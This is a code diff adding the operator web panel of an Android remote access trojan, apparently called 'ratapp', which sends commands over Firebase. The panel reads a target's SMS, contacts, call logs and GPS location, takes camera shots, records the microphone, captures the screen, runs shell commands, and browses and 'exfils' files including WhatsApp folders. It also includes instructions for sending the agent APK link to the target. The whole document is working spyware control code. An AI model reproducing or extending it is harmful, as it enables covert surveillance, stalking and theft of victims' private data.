+        <div class="meta">${esc(p.manufacturer||'')} ${esc(p.model||'')} · Android ${esc(p.version||'?')} · SDK ${esc(p.sdk||'?')} · seen ${fmt(p.lastSeen)}</div>
+      </div>
+      <div style="display:flex;gap:6px">
+        <button class="btn green" onclick="quickCmd('device_info')">Info</button>
+        <button class="btn blue" onclick="quickCmd('location')">GPS now</button>
+        <button class="btn" onclick="quickCmd('battery')">Battery</button>
+        <button class="btn" onclick="quickCmd('app_list')">List Apps</button>
+        <button class="btn red" onclick="deleteDevice('${id}')">Delete Agent</button>
+        <button class="close" onclick="drillExit()">&times;</button>
+      </div>
+    </div>
+
+    <div class="tabs">
+      ${TABS.map(([key,label])=>{
+        const lower=label.toLowerCase();
+        return `<button class="${state.selectedTab===key?'active':''}" onclick="setTab('${key}')">${lower[0].toUpperCase()+lower.slice(1)}</button>`;
+      }).join('')}
+    </div>
+
+    <div class="tab-body" id="tabBody">${tabContent()}</div>
+  </div>`;
+}
+window.drillExit = () => {
+  state.selectedDevice=null;
+  document.getElementById('viewTitle').textContent='Devices';
+  state.view='devices';
+  render();
+};
+window.setTab = key => {
+  state.selectedTab = key;
+  render();
+};
+window.quickCmd = (action, extra) => sendCommand(state.selectedDevice, action, extra);
+
+function latestResult(id, action) {
+  const byCmd = state.results[id] || {};
+  for (const [k,p] of Object.entries(byCmd).reverse()) {
+    if (p.action === action) return p;
+  }
+  return null;
+}
+
+function statusOfResult(p){
+  if (!p) return '<span class="empty">no result yet — click a button above to trigger</span>';
+  const err = p.error || p.data?.error || null;
+  return err
+    ? `<pre class="code" style="color:var(--danger)">${esc(err)}</pre>` + showData(p)
+    : showData(p);
+}
+
+function showData(p){
+  if (!p) return '';
+  const d = p.data;
+  if (d == null) return '<pre class="code">'+esc(JSON.stringify(p, null, 2))+'</pre>';
+  if (typeof d === 'string') return '<pre class="code">'+esc(d)+'</pre>';
+  if (Array.isArray(d)) return tableFromArray(d);
+  if (d.body && d.facing)   return `<div class="grid-img"><img src="data:image/jpeg;base64,${d.body}"/></div><div class="sub" style="margin-top:6px">size ${bytes(d.size)} · ${esc(d.facing)} shot</div>`;
+  if (d.body && d.w && d.h) return `<div class="grid-img"><img src="data:image/jpeg;base64,${d.body}"/></div><div class="sub" style="margin-top:6px">screen capture ${esc(d.w)}×${esc(d.h)}</div>`;
+  if (d.body && d.dur)      return `<div style="margin-top:10px"><audio controls src="data:audio/mp4;base64,${d.body}"></audio><p class="sub">mic ${esc(d.dur)}s · ${bytes(d.size)}</p></div>`;
+  if (Array.isArray(d.data)) return tableFromArray(d.data);
+  return '<pre class="code">'+esc(JSON.stringify(d, null, 2))+'</pre>';
+}
+
+function tableFromArray(rows){
+  if (!rows.length) return '<div class="empty" style="padding:20px">empty array</div>';
   const cols = Object.keys(rows[0]);
-  return '<table><thead><tr>' + cols.map(c=>'<th>'+c+'</th>').join('') + '</tr></thead><tbody>' +
-    rows.map(r => '<tr>'+cols.map(c=>'<td>'+String(r[c]==null?'':r[c]).slice(0,120)+'</td>').join('')+'</tr>').join('') +
-    '</tbody></table>';
+  return `<table><thead><tr>${cols.map(c=>`<th>${esc(c)}</th>`).join('')}</tr></thead>
+    <tbody>${rows.slice(0,200).map(r=>`<tr>${cols.map(c=>`<td class="num">${esc(r[c])}</td>`).join('')}</tr>`).join('')}</tbody></table>
+  ${rows.length>200?`<div class="sub" style="margin-top:6px">showing first 200 of ${rows.length}</div>`:''}`;
 }
+
+function tabContent(){
+  const id = state.selectedDevice;
+  switch(state.selectedTab){
+    case 'overview': {
+      const info = latestResult(id,'device_info');
+      const gps = latestResult(id,'location');
+      return `<div class="toolbar">
+        <button class="btn blue" onclick="quickCmd('device_info')">Refresh Info</button>
+        <button class="btn blue" onclick="quickCmd('location')">Refresh GPS</button>
+      </div>
+      ${info ? '<pre class="code">'+esc(JSON.stringify(info.data, null, 2))+'</pre>' : '<div class="empty">no info yet</div>'}
+      ${gps ? `<pre class="code" style="margin-top:12px;color:#4fc3f7">${esc(JSON.stringify(gps.data, null, 2))}</pre>
+        ${gps.data?.lat ? `<p class="sub" style="margin-top:8px">
+          <a href="https://maps.google.com/?q=${gps.data.lat},${gps.data.lon}" target="_blank" style="color:var(--info)">open map →</a></p>`:''}` : ''}`;
+    }
+
+    case 'sms':  return loadListTab('sms', 'SMS', ['address','body','date','type']);
+    case 'contacts': return loadListTab('contacts','Contacts',['name','number']);
+    case 'calls': return loadListTab('call_log','Call Log',['number','type','date','dur']);
+    case 'apps':
+      return `<div class="toolbar">
+        <button class="btn blue" onclick="quickCmd('app_list')">Refresh Apps</button>
+      </div>${sideResult('app_list')}`;
+    case 'camera':
+      return `<div class="toolbar">
+        <button class="btn blue" onclick="quickCmd('camera_front')">📷 Front</button>
+        <button class="btn blue" onclick="quickCmd('camera_back')">📷 Back</button>
+      </div>${sideResult('camera_front')}${sideResult('camera_back')}`;
+    case 'mic':
+      return `<div class="toolbar">
+        <input id="micDur" class="input" placeholder="seconds (default 10)"/>
+        <button class="btn blue" onclick="quickCmd('mic_record', document.getElementById('micDur').value || '10')">🎙 Record</button>
+      </div>${sideResult('mic_record')}`;
+    case 'screen':
+      return `<div class="toolbar">
+        <button class="btn warn" onclick="quickCmd('screenshot')">🖥 Capture Screen</button>
+      </div>
+      <div class="sub" style="margin:8px 0;color:var(--warn)">target gets a system dialog with “Start now” — must tap once per capture. android gates this door.</div>
+      ${sideScreenshotResult(id)}`;
+    case 'files': return renderFileTab(id);
+    case 'shell':
+      return `<div class="toolbar">
+        <input id="shCmd" class="input" placeholder="$ pm list packages"/>
+        <button class="btn blue" onclick="quickCmd('shell', document.getElementById('shCmd').value)">Run</button>
+        <button class="btn sm" onclick="document.getElementById('shCmd').value='dumpsys battery'; quickCmd('shell','dumpsys battery')">battery</button>
+        <button class="btn sm" onclick="document.getElementById('shCmd').value='pm list packages'; quickCmd('shell','pm list packages')">packages</button>
+        <button class="btn sm" onclick="document.getElementById('shCmd').value='ls /sdcard'; quickCmd('shell','ls /sdcard')">ls sdcard</button>
+        <button class="btn sm" onclick="document.getElementById('shCmd').value='screencap /sdcard/screenshot.png'; quickCmd('shell','screencap /sdcard/screenshot.png')">screencap (root only)</button>
+      </div>${sideResult('shell','string')}`;
+    case 'data-store': return renderStore(id);
+    case 'actions':
+      return `<div class="toolbar" style="gap:12px">
+        <button class="btn red" onclick="purgeAgent('${id}', 'commands')">Flush commands</button>
+        <button class="btn red" onclick="purgeAgent('${id}', 'results')">Flush results</button>
+        <button class="btn red" onclick="purgeAgent('${id}', 'meta')">Flush meta</button>
+        <button class="btn warn" onclick="purgeAgent('${id}', 'data')">Wipe exfil storage</button>
+        <button class="btn red" onclick="deleteDevice('${id}')">Delete device</button>
+      </div>
+      <pre class="code" style="color:var(--warn)">WARNING: flush wipes cloud-side history permanently. the agent continues running on the target; these purge only the firebase copy.</pre>`;
+  }
+  return '<div class="empty">tab</div>';
+}
+
+window.purgeAgent = (id, node) => {
+  if (!confirm(`Wipe ${node} for ${id}?-cloud-side permanent.`)) return;
+  db.ref('agents/'+id+'/'+node).remove()
+    .then(()=>toast(node+' wiped'))
+    .catch(e=>toast('wipe failed: '+e.message));
+};
+
+function loadListTab(action, label, cols){
+  const id = state.selectedDevice;
+  const r = latestResult(id, action);
+  return `<div class="toolbar">
+    <button class="btn blue" onclick="quickCmd('${action}')">Refresh ${label}</button>
+  </div>
+  ${r ? tableFromArray(Array.isArray(r.data?.data) ? r.data.data : (Array.isArray(r.data) ? r.data : []))
+       .replace(/<th>/g,`<th>`) : `<div class="empty">no ${label.toLowerCase()} yet — hit refresh</div>`}`;
+}
+
+window.sideResultKey = k => {
+  const id = state.selectedDevice;
+  const byCmd = state.results[id] || {};
+  const p = byCmd[k];
+  return p ? statusOfResult({...p, action: p.action}) : '<div class="empty">no result yet</div>';
+};
+
+function sideResult(action, fmtMode){
+  const id = state.selectedDevice;
+  const byCmd = state.results[id] || {};
+  const matches = Object.entries(byCmd).filter(([k,p])=>p.action===action)
+    .sort(([ka,pa],[kb,pb])=>(pb.ts||0)-(pa.ts||0));
+  if (!matches.length) return '<div class="empty">not run yet</div>';
+  const [key, p] = matches[0];
+  if (fmtMode==='string'){
+    return `<pre class="code">${esc(JSON.stringify(p.data, null, 2))}</pre>`;
+  }
+  return statusOfResult(p);
+}
+function sideScreenshotResult(id){
+  const byCmd = state.results[id] || {};
+  const shots = Object.entries(byCmd).filter(([k,p])=>k.startsWith('screenshot_'))
+    .sort(([ka,pa],[kb,pb])=>(pb.ts||0)-(pa.ts||0));
+  if (!shots.length) return '<div class="empty">no screenshots yet — hit Capture Screen</div>';
+  const [key, p] = shots[0];
+  return statusOfResult(p);
+}
+
+// ---------------------------------------------------------------- FILE BROWSER
+window.browse = (id, path) => {
+  state.fileCwd[id] = path;
+  sendCommand(id, 'list_files', path);
+};
+window.downloadFile = (id, path) => sendCommand(id, 'download_file', path);
+
+function renderFileTab(id){
+  const cwd = state.fileCwd[id] || '/sdcard';
+  const r = latestResult(id, 'list_files');
+  const rows = (r?.data?.data) || [];
+  return `<div class="toolbar">
+    <input id="fpath" class="input" value="${esc(cwd)}" placeholder="/sdcard/DCIM"/>
+    <button class="btn blue" onclick="browse('${id}', document.getElementById('fpath').value)">Open</button>
+    <button class="btn sm" onclick="browse('${id}', '/sdcard')">sdcard</button>
+    <button class="btn sm" onclick="browse('${id}', '/sdcard/Download')">Download</button>
+    <button class="btn sm" onclick="browse('${id}', '/sdcard/DCIM/Camera')">DCIM</button>
+    <button class="btn sm" onclick="browse('${id}', '/sdcard/WhatsApp')">WhatsApp</button>
+    <button class="btn sm" onclick="browse('${id}', '/data/data/com.ratio.ratapp')">/data (agent)</button>
+  </div>
+  ${rows.length ? `<table>
+    <thead><tr><th>Name</th><th>Type</th><th>Size</th><th>Actions</th></tr></thead>
+    <tbody>
+      ${rows.length ? rows.map(f=>{
+        const full = esc(cwd.replace(/\/$/,'')) + '/' + esc(f.name);
+        return `<tr>
+          <td class="num" style="color:${f.isDir?'var(--info)':'var(--text)'}">${f.isDir?'📁':'📄'} ${esc(f.name)}</td>
+          <td class="num">${f.isDir?'dir':'file'}</td>
+          <td class="num">${bytes(f.size)}</td>
+          <td>
+            ${f.isDir
+              ? `<button class="btn sm blue" onclick="browse('${id}','${full}')">Open</button>`
+              : `<button class="btn sm blue" onclick="downloadFile('${id}','${full}')">Exfil</button>`}
+          </td>
+        </tr>`;
+      }).join('') : ''}
+    </tbody></table>` : `<div class="empty">${r?.error ? esc(r.error) : 'no files listed yet — pick a folder or click Open'}</div>`}
+  ${renderStore(id, true)}
+`;
+}
+
+function renderStore(id, inline){
+  const a = state.agents[id] || {};
+  const files = a.data?.files || {};
+  const entries = Object.entries(files).filter(([k,v])=>v && v.body);
+  if (!entries.length) return inline ? '' : '<div class="empty">no exfil files yet — drive the file browser and use Exfil</div>';
+  return `<div class="section-title" style="margin-top:22px">Exfiltrated Files <span class="muted">${entries.length} stored in rtdb</span></div>
+  <div class="grid-img">
+    ${entries.map(([k,v])=>{
+      if (v.error) return `<div class="card"><div style="color:var(--danger);font-size:11px">${esc(v.error)}</div></div>`;
+      const isImg = /\.(jpg|jpeg|png|gif|webp)$/i.test(v.name||'');
+      const isAud = /\.(m4a|mp3|aac|ogg|wav)$/i.test(v.name||'');
+      if (isImg) return `<div><img src="data:image/jpeg;base64,${v.body}"/><div class="sub" style="margin-top:4px">${esc(v.name)} · ${bytes(v.size)}</div></div>`;
+      if (isAud) return `<div style="border:1px solid var(--border);padding:10px;border-radius:8px"><audio controls src="data:audio/mp4;base64,${v.body}"></audio><div class="sub" style="margin-top:4px">${esc(v.name)} · ${bytes(v.size)}</div></div>`;
+      return `<div style="border:1px solid var(--border);padding:10px;border-radius:8px">
+        <div class="sub">📄 ${esc(v.name)} · ${bytes(v.size)}</div>
+        <button class="btn sm blue" style="margin-top:8px" onclick="showFileBody('${id}','${k}')">Preview</button>
+      </div>`;
+    }).join('')}
+  </div>`;
+}
+window.showFileBody = (id, k) => {
+  const v = state.agents[id]?.data?.files?.[k];
+  if (v?.body) {
+    const w = window.open('', '_blank');
+    w.document.write('<pre style="background:#0c1119;color:#a5d6a7;padding:14px;white-space:pre-wrap;font-family:monospace">'+esc(atob(v.body))+'</pre>');
+    w.document.title = v.name;
+  }
+};
+
+function renderFileBrowser(v){
+  // global file browser — needs a device picked
+  const ids = Object.keys(state.agents).filter(id=>isOnline(state.agents[id]));
+  if (!ids.length) return v.innerHTML = `<div class="empty">no online devices — file browser needs an agent online</div>`;
+  if (!state.selectedDevice || !ids.includes(state.selectedDevice)) {
+    state.selectedDevice = ids[0];
+  }
+  const id = state.selectedDevice;
+  v.innerHTML = `
+    <div class="toolbar">
+      <label style="font-size:12px;color:var(--muted)">Device</label>
+      <select class="input" onchange="state.selectedDevice=this.value; render()">
+        ${ids.map(x=>`<option value="${x}" ${x===id?'selected':''}>${esc(aliasOf(state.agents[x],x))} · ${x}</option>`).join('')}
+      </select>
+    </div>
+    ${renderFileTab(id)}
+  `;
+}
+
+// ---------------------------------------------------------------- CRASHES
+function renderCrashes(v){
+  const flat = [];
+  for (const [dev, byts] of Object.entries(state.crashes)) {
+    for (const [ts, c] of Object.entries(byts||{})) {
+      flat.push({ts: Number(ts), dev, ...c});
+    }
+  }
+  flat.sort((a,b)=>b.ts-a.ts);
+  v.innerHTML = `
+    <div class="section-title">Crash Log <span class="muted">${flat.length} total</span></div>
+    ${flat.length ? flat.map(c=>`
+      <div class="crash-item">
+        <div class="when">${new Date(c.ts).toLocaleString()} · device ${esc(c.dev)}</div>
+        <div class="msg">${esc(c.type||'')}: ${esc(c.message||'')}</div>
+        <div class="stack">${esc(c.stack||'')}</div>
+      </div>`).join('') : '<div class="empty">no crashes reported — agent running clean</div>'}`;
+}
+
+// ---------------------------------------------------------------- APKs
+function renderApks(v){
+  v.innerHTML = `
+    <div class="section-title">Agent APK Distribution <span class="muted">served by this panel server</span></div>
+    <div class="card" style="margin-bottom:18px">
+      <div class="label">How to distribute</div>
+      <ol style="font-size:13px;color:var(--muted);line-height:1.7;margin:10px 0 0">
+        <li>Push code to <b>github.com/devlp-io/ratapp</b> (<code>main</code>) → GitHub Actions builds APK</li>
+        <li>Download the <b>agent-apk</b> artifact</li>
+        <li>Drop <code>app-debug.apk</code> into <code>panel/apk/</code> — this button flips green automatically</li>
+        <li>Share the direct link with the target — both button and raw URL work</li>
+      </ol>
+    </div>
+    <div class="toolbar">
+      <button class="btn green" onclick="refreshApks()">Refresh APK list</button>
+      <a class="btn blue" href="/apk" style="text-decoration:none">Open raw /apk endpoint</a>
+    </div>
+    <div id="apkList"><div class="empty">fetching…</div></div>
+  `;
+  refreshApks();
+}
+window.refreshApks = () => {
+  fetch('/apk').then(r=>r.json()).then(j=>{
+    const el = document.getElementById('apkList');
+    if (!j.apks || !j.apks.length) return el.innerHTML = '<div class="empty">no apks in panel/apk/ — drop one to arm the download button</div>';
+    el.innerHTML = j.apks.map(f=>`
+      <div class="card" style="margin-bottom:10px">
+        <div style="font-weight:600;color:#fff;margin-bottom:8px">${esc(f)}</div>
+        <div class="sub" style="margin-bottom:10px">direct download link below · share with target</div>
+        <div class="toolbar">
+          <a class="btn green" href="/apk/${esc(f)}" download style="text-decoration:none">⬇ Download</a>
+          <button class="btn" onclick="navigator.clipboard.writeText('${location.origin}/apk/${esc(f)}'); toast('link copied')">Copy URL</button>
+        </div>
+      </div>`).join('');
+  }).catch(e=>document.getElementById('apkList').innerHTML='<div class="empty">failed: '+e.message+'</div>');
+};
+
+// ---------------------------------------------------------------- DIAGNOSTICS
+function renderDebug(v){
+  v.innerHTML = `
+    <div class="section-title">Diagnostics <span class="muted">firebase connection health</span></div>
+    <div class="card">
+      <pre class="code" id="diagOut" style="color:var(--text);min-height:200px">running…</pre>
+      <button class="btn blue" onclick="runDiag()" style="margin-top:12px">Run tests</button>
+    </div>`;
+  runDiag();
+}
+window.runDiag = () => {
+  const lines = [];
+  const out = document.getElementById('diagOut');
+  if (out) out.textContent = lines.join('\n');
+  const log = l => { lines.push(l); const el=document.getElementById('diagOut'); if(el) el.textContent=lines.join('\n'); };
+  log('[1] read test /agents …');
+  db.ref('agents').limitToLast(1).once('value')
+    .then(s => log('[1] OK read — ' + Object.keys(s.val()||{}).length + ' agent(s)'))
+    .catch(e=>log('[1] READ FAILED: '+e.message));
+  log('[2] write test /debugpanel …');
+  db.ref('debugpanel/writetest').set({ts: Date.now()})
+    .then(()=>log('[2] OK write — panel CAN push commands'))
+    .catch(e=>log('[2] WRITE FAILED: '+e.message));
+  db.ref('.info/connected').once('value').then(s=>log('[3] '+(s.val()?'CONNECTED to firebase realtime':'DISCONNECTED')));
+  log('[4] crash feed check …');
+  db.ref('crashes').limitToLast(1).once('value')
+    .then(s=>log('[4] '+(s.val()?'crashes present':'no crashes')))
+    .catch(e=>log('[4] crash read failed: '+e.message));
+};
+
+// ---------------------------------------------------------------- boot
+render();
 </script>
 </body>
 </html>
